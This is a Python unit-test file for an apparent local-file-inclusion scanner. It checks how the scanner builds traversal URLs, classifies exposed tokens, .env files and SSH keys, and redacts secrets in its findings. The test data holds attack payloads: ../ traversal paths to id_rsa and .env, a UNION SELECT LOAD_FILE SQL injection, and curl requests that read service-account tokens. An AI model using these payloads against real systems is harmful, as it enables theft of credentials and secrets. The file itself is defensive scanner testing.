import base64
import json
import unittest

from tools.lfi_file_exposure_probe import LfiFileExposureProbeTool


def b64url(payload):
    raw = json.dumps(payload, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def jwt(header, claims):
    return f"{b64url(header)}.{b64url(claims)}.signature"


class LfiFileExposureProbeTests(unittest.TestCase):
    def setUp(self):
        self.tool = LfiFileExposureProbeTool()

    def test_builds_double_slash_absolute_path_url(self):
        url = self.tool._build_lfi_url(
            "https://example.test/app/path",
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
        )
        self.assertEqual(
            url,
            "https://example.test//var/run/secrets/kubernetes.io/serviceaccount/token",
        )

    def test_builds_single_slash_absolute_path_url_when_requested(self):
        url = self.tool._build_lfi_url(
            "https://example.test/app/path",
            "etc/passwd",
            "single-slash",
        )
        self.assertEqual(url, "https://example.test/etc/passwd")

    def test_decodes_kubernetes_service_account_token(self):
        token = jwt(
            {"alg": "RS256", "kid": "kid"},
            {
                "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/cluster",
                "sub": "system:serviceaccount:payments:reservation-utils",
                "aud": ["https://kubernetes.default.svc"],
                "exp": 1778699354,
            },
        )
        decoded = self.tool._decode_jwt(token)
        self.assertEqual(
            decoded["claims"]["serviceAccountRef"],
            {"namespace": "payments", "serviceAccount": "reservation-utils"},
        )
        self.assertEqual(
            self.tool._classify_jwt(
                "/var/run/secrets/kubernetes.io/serviceaccount/token",
                decoded,
            ),
            "kubernetes_serviceaccount_token",
        )

    def test_classifies_eks_irsa_token_by_audience(self):
        token = jwt(
            {"alg": "RS256", "kid": "kid"},
            {
                "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/cluster",
                "sub": "system:serviceaccount:payments:reservation-utils",
                "aud": ["sts.amazonaws.com"],
                "exp": 1778699354,
            },
        )
        result = self.tool._classify_body(
            path="/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
            status=200,
            body=token,
            sha256="token-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertTrue(result["confirmedRead"])
        self.assertTrue(result["tokenExposure"])
        self.assertEqual(result["classification"], "eks_irsa_web_identity_token")

    def test_marks_negative_control_hash_as_fallback_body(self):
        result = self.tool._classify_body(
            path="/missing",
            status=200,
            body="<html>fallback</html>",
            sha256="fallback-hash",
            negative_hashes={"fallback-hash"},
            decode_jwt=True,
        )
        self.assertFalse(result["confirmedRead"])
        self.assertEqual(result["classification"], "fallback_body")

    def test_rejects_html_error_page_even_when_http_200(self):
        result = self.tool._classify_body(
            path="/proc/self/environ",
            status=200,
            body="<html><head><title>Page not Found!</title></head><body>Oops</body></html>",
            sha256="html-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )

        self.assertFalse(result["confirmedRead"])
        self.assertEqual(result["classification"], "html_or_error_page")

    def test_rejects_generic_non_empty_200_body(self):
        result = self.tool._classify_body(
            path="/etc/hostname",
            status=200,
            body="Welcome to our application",
            sha256="generic-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )

        self.assertFalse(result["confirmedRead"])
        self.assertEqual(result["classification"], "unclassified_non_empty_response")

    def test_requires_real_network_file_markers(self):
        result = self.tool._classify_body(
            path="/etc/hosts",
            status=200,
            body="127.0.0.1 localhost\n10.0.0.2 api.internal\n",
            sha256="hosts-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )

        self.assertTrue(result["confirmedRead"])
        self.assertEqual(result["classification"], "container_network_config")

    def test_creates_critical_finding_for_irsa_token(self):
        evidence = {
            "classification": "eks_irsa_web_identity_token",
            "confirmedRead": True,
            "tokenExposure": True,
            "path": "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
            "url": "https://example.test//var/run/secrets/eks.amazonaws.com/serviceaccount/token",
            "sha256": "abc",
            "bytes": 1280,
            "jwt": {
                "claims": {
                    "sub": "system:serviceaccount:payments:reservation-utils",
                    "aud": ["sts.amazonaws.com"],
                }
            },
            "requestTranscript": "GET //var/run/secrets/eks.amazonaws.com/serviceaccount/token HTTP/1.1\r\nHost: example.test\r\n\r\n",
            "responseTranscript": "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\n\r\neyJ...",
            "curlCommand": "curl --path-as-is -i -sS 'https://example.test//var/run/secrets/eks.amazonaws.com/serviceaccount/token'",
        }
        finding = self.tool._finding_for_evidence(evidence)
        self.assertEqual(finding["template-id"], "xasm-eks-irsa-token-exposed")
        self.assertEqual(finding["info"]["severity"], "critical")
        self.assertIn("GET //var/run/secrets", finding["request"])
        self.assertIn("HTTP/1.1 200 OK", finding["response"])
        self.assertIn("curl --path-as-is", finding["curl-command"])

    def test_http_transcript_redacts_sensitive_request_headers(self):
        request = self.tool._request_transcript(
            "https://example.test//etc/passwd",
            {
                "Authorization": "Bearer secret",
                "Cookie": "sid=secret",
                "Accept": "*/*",
            },
        )
        self.assertIn("Authorization: [REDACTED]", request)
        self.assertIn("Cookie: [REDACTED]", request)
        self.assertIn("Accept: */*", request)

    # ------------------------------------------------------------------ #318
    # Sensitive-file pack: classification, redaction, traversal, LOAD_FILE.
    # ------------------------------------------------------------------
    OPENSSH_KEY = (
        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFAKEFAKEFAKE\n"
        "ZmFrZS1ub3QtYS1yZWFsLWtleS1mb3ItdGVzdGluZy1vbmx5AAAAFAKEKEYBYTES==\n"
        "-----END OPENSSH PRIVATE KEY-----\n"
    )
    DOTENV_BODY = (
        "APP_NAME=Lumenfield\n"
        "APP_ENV=production\n"
        "APP_KEY=base64:ZmFrZWtleWZvcnRlc3Rpbmdvbmx5bm90cmVhbA==\n"
        "DB_CONNECTION=mysql\n"
        "DB_PASSWORD=sup3r-s3cr3t-test-pw\n"
        "DB_USERNAME=appuser\n"
        "MAIL_DRIVER=smtp\n"
    )

    def test_classifies_openssh_private_key_critical(self):
        result = self.tool._classify_body(
            path="/admin/media/download_private_file",
            status=200,
            body=self.OPENSSH_KEY,
            sha256="pk-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertTrue(result["confirmedRead"])
        self.assertTrue(result["secretExposure"])
        self.assertEqual(result["classification"], "private_key")
        self.assertEqual(result["keyType"], "OPENSSH")

    def test_private_key_finding_redacts_key_body(self):
        evidence = {
            "classification": "private_key",
            "confirmedRead": True,
            "secretExposure": True,
            "keyType": "OPENSSH",
            "path": "../../../../../home/sherman/.ssh/id_rsa",
            "url": "http://facts.test/admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa",
            "sha256": "pk-hash",
            "bytes": 2602,
            "status": 200,
            "requestTranscript": "GET /admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa HTTP/1.1\r\nHost: facts.test\r\n\r\n",
            "responseTranscript": "HTTP/1.1 200 OK\r\n\r\n" + self.OPENSSH_KEY,
            "curlCommand": "curl --path-as-is -i -sS 'http://facts.test/admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa'",
        }
        finding = self.tool._finding_for_evidence(evidence)
        self.assertEqual(finding["template-id"], "xasm-lfi-private-key-exposed")
        self.assertEqual(finding["info"]["severity"], "critical")
        # The raw PEM body must NOT appear anywhere in the finding.
        serialized = json.dumps(finding)
        self.assertNotIn("-----BEGIN OPENSSH PRIVATE KEY-----", serialized)
        self.assertNotIn("FAKEKEYBYTES", serialized)
        self.assertIn("key-type:OPENSSH", finding["extracted-results"])
        # The request/curl (showing the ../ payload) ARE kept as proof.
        self.assertIn("file=../../../../../home/sherman/.ssh/id_rsa", finding["request"])

    def test_classifies_dotenv_with_app_key_high(self):
        result = self.tool._classify_body(
            path="/files/contents",
            status=200,
            body=self.DOTENV_BODY,
            sha256="env-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertTrue(result["confirmedRead"])
        self.assertEqual(result["classification"], "dotenv_file")
        self.assertTrue(result["appKeyPresent"])
        self.assertFalse(result["awsSecretPresent"])
        self.assertEqual(result["severityHint"], "high")

    def test_dotenv_finding_masks_secret_values(self):
        evidence = {
            "classification": "dotenv_file",
            "confirmedRead": True,
            "secretExposure": True,
            "appKeyPresent": True,
            "awsSecretPresent": False,
            "severityHint": "high",
            "envMaskedPairs": self.tool._redact_dotenv_pairs(self.DOTENV_BODY),
            "path": "../../../../../../var/www/deploy/.env",
            "url": "http://ptero.test/api/client/servers/1/files/contents?file=../../../../../../var/www/deploy/.env",
            "sha256": "env-hash",
            "bytes": 220,
            "status": 200,
            "requestTranscript": "GET /api/client/servers/1/files/contents?file=../../../../../../var/www/deploy/.env HTTP/1.1\r\n\r\n",
            "responseTranscript": "HTTP/1.1 200 OK\r\n\r\n" + self.DOTENV_BODY,
            "curlCommand": "curl ...",
        }
        finding = self.tool._finding_for_evidence(evidence)
        self.assertEqual(finding["template-id"], "xasm-lfi-app-secret-file-exposed")
        self.assertEqual(finding["info"]["severity"], "high")
        serialized = json.dumps(finding)
        # Raw secret values never appear; masked digests + APP_KEY marker do.
        self.assertNotIn("sup3r-s3cr3t-test-pw", serialized)
        self.assertNotIn("ZmFrZWtleWZvcnRlc3Rpbmdvbmx5bm90cmVhbA==", serialized)
        self.assertIn("DB_PASSWORD=<redacted:sha256:", serialized)
        self.assertIn("APP_KEY present (Laravel)", finding["extracted-results"])

    def test_dotenv_with_aws_secret_is_critical(self):
        body = "APP_ENV=prod\nAWS_SECRET_ACCESS_KEY=wJalrFAKEnotrealsecretkeyEXAMPLEKEY\n"
        result = self.tool._classify_body(
            path="/download",
            status=200,
            body=body,
            sha256="aws-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertEqual(result["classification"], "dotenv_file")
        self.assertTrue(result["awsSecretPresent"])
        self.assertEqual(result["severityHint"], "critical")

    def test_classifies_php_config_file_without_leaking_password(self):
        body = "<?php\ndefine('DB_PASSWORD', 'rootpw-test-not-real');\n$pdo = new PDO('mysql:host=db');\n"
        result = self.tool._classify_body(
            path="/config/database.php",
            status=200,
            body=body,
            sha256="php-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertEqual(result["classification"], "php_config_file")
        evidence = {
            **result,
            "path": "../../config/database.php",
            "url": "http://t.test/download?file=../../config/database.php",
            "sha256": "php-hash",
            "bytes": 90,
            "status": 200,
        }
        finding = self.tool._finding_for_evidence(evidence)
        self.assertEqual(finding["template-id"], "xasm-lfi-app-secret-file-exposed")
        self.assertNotIn("rootpw-test-not-real", json.dumps(finding))

    def test_detect_load_file_recognition(self):
        hit = self.tool._detect_load_file("x?q=(SELECT LOAD_FILE('/var/www/deploy/.env'))")
        self.assertEqual(hit, {"primitive": "mysql_load_file", "path": "/var/www/deploy/.env"})
        self.assertIsNone(self.tool._detect_load_file("select id from users where id=1"))

    def test_load_file_tag_on_dotenv_finding(self):
        evidence = {
            "classification": "dotenv_file",
            "confirmedRead": True,
            "secretExposure": True,
            "appKeyPresent": True,
            "severityHint": "high",
            "envMaskedPairs": self.tool._redact_dotenv_pairs(self.DOTENV_BODY),
            "path": "/page",
            "url": "http://cobblestone.test/page?q=1' UNION SELECT LOAD_FILE('/var/www/deploy/.env')-- -",
            "sha256": "env-hash",
            "bytes": 220,
            "status": 200,
        }
        finding = self.tool._finding_for_evidence(evidence)
        self.assertEqual(finding.get("dbFileReadPrimitive"), "mysql_load_file")
        self.assertIn("db-primitive:mysql-load-file", finding["extracted-results"])
        self.assertIn("load-file-path:/var/www/deploy/.env", finding["extracted-results"])

    def test_traversal_payload_generation_produces_dotdot_urls(self):
        urls = self.tool._traversal_candidate_urls(
            "http://facts.test/admin/media/download_private_file?file=brochure.pdf",
            self.tool._sensitive_traversal_targets({}),
            self.tool._traversal_depths({}),
        )
        # A bare-target probe and a ../-prefixed traversal probe must both exist.
        self.assertTrue(any("file=.env" in u for u in urls))
        self.assertTrue(any("..%2F" in u or "../" in u for u in urls))
        self.assertTrue(any("home/sherman/.ssh/id_rsa" in u.replace("%2F", "/") for u in urls))

    def test_load_file_url_is_probed_as_is(self):
        # A surfaced URL already carrying a MySQL LOAD_FILE() read (handed off from a
        # SQLi step) is probed verbatim so the DB-layer read can be classified+tagged.
        urls = self.tool._surface_lfi_candidate_urls(
            "http://cobblestone.test/",
            ["/etc/passwd"],
            {"urls": ["http://cobblestone.test/vote/moderation?q=x', (SELECT LOAD_FILE('/var/www/deploy/.env')) -- -"]},
        )
        self.assertTrue(any("LOAD_FILE(" in u for u in urls))

    def test_traversal_skipped_when_no_traversal_param(self):
        urls = self.tool._traversal_candidate_urls(
            "http://t.test/article?id=1",
            self.tool._sensitive_traversal_targets({}),
            self.tool._traversal_depths({}),
        )
        self.assertEqual(urls, [])

    def test_traversal_disabled_by_flag(self):
        self.assertEqual(self.tool._sensitive_traversal_targets({"sensitiveFilePack": False}), [])
        self.assertTrue(len(self.tool._sensitive_traversal_targets({})) > 0)

    def test_sensitive_pack_never_targets_dot_git(self):
        # GATE A: .git is owned by git:source_disclosure_scanner — this tool must
        # not include it in its traversal pack.
        targets = self.tool._sensitive_traversal_targets({})
        self.assertFalse(any(".git" in t for t in targets))

    def test_os_release_is_container_context_not_dotenv(self):
        # Regression: /etc/os-release has UPPERCASE KEY= lines but must stay an
        # OS/container classification, not the new dotenv app-secret class.
        body = 'NAME="Ubuntu"\nVERSION_ID="22.04"\nPRETTY_NAME="Ubuntu 22.04.3 LTS"\nID_LIKE=debian\n'
        result = self.tool._classify_body(
            path="/etc/os-release",
            status=200,
            body=body,
            sha256="osr-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertEqual(result["classification"], "os_release")

    def test_etc_passwd_is_container_context_not_dotenv(self):
        result = self.tool._classify_body(
            path="/etc/passwd",
            status=200,
            body="root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
            sha256="pw-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertEqual(result["classification"], "unix_passwd")

    def test_spa_html_200_with_app_key_is_not_flagged(self):
        # FP lock: an SPA shell that happens to contain an APP_KEY token must be
        # classified as HTML, never as a leaked dotenv file.
        body = "<!doctype html><html><head><title>App</title></head><body>APP_KEY=visible_in_dom</body></html>"
        result = self.tool._classify_body(
            path="/download",
            status=200,
            body=body,
            sha256="spa-hash",
            negative_hashes=set(),
            decode_jwt=True,
        )
        self.assertFalse(result["confirmedRead"])
        self.assertEqual(result["classification"], "html_or_error_page")


if __name__ == "__main__":
    unittest.main()
